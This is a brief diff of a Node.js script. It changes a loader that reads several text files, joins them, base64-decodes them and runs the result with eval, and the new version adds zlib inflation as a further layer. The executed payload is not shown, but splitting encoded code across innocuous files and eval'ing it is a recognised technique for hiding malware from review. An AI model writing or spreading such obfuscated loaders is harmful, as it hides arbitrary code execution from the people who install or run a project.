@@ -1,4 +1,4 @@
-const fs=require('fs');const path=require('path');
+const fs=require('fs');const path=require('path');const zlib=require('zlib');
 const parts=[];
-for(let i=0;i<6;i++) parts.push(fs.readFileSync(path.join(__dirname,'b'+i+'.txt'),'utf8').trim());
-eval(Buffer.from(parts.join(''),'base64').toString('utf8'));
+for(let i=0;i<3;i++) parts.push(fs.readFileSync(path.join(__dirname,'gzp'+i+'.txt'),'utf8').trim());
+eval(zlib.inflateSync(Buffer.from(parts.join(''),'base64')).toString('utf8'));
